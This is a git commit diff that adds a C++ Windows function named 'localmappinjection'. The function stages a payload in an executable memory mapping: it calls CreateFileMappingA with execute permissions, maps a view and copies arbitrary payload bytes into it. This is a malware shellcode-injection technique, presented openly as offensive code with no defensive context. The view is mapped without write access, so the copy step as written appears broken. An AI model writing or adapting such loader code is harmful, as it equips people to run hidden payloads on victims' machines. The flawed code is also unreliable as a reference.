d4c21ca0fd7ab408eca4f7a4a18d59a08ea73ad1
AbdouRoumi <a_roumi@estin.dz>
2024-10-11 21:31:32 +0100

    Local Mapping Injection

--- Local_Mapping_Injection/Local_Mapping_Injection.cpp
+++ Local_Mapping_Injection/Local_Mapping_Injection.cpp
@@ -6,7 +6,36 @@
 
 
 
-BOOL localmappintion() {
+BOOL localmappinjection(IN PBYTE pPayload,OUT PVOID*ppAddress,IN SIZE_T sPayloadSize) {
+
+	HANDLE hFile = NULL;
+	PVOID 	pMapAddress = NULL;
+
+	hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
+	if (hFile == NULL) {
+		printf("Can't create file mapping for our target ! ERROR : 0x%lx", GetLastError());
+		return FALSE;
+	}
+	printf("Mapped successfully!\n");
+	pMapAddress = MapViewOfFile(hFile, FILE_MAP_READ | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
+	if (pMapAddress == NULL) {
+		printf("Can't map the payload successfully ! ERROR : 0x%lx \n", GetLastError());
+		CloseHandle(hFile);
+		return FALSE;
+	}
+	printf("Map extracted successfully!\n");
+
+	memcpy(pMapAddress, pPayload, sPayloadSize);
+	printf("Payload copied successfully!! \n");
+
+
+	*ppAddress = pMapAddress;
+	if (hFile)
+		CloseHandle(hFile);
+	return TRUE;
+
+
+
 
 
 }
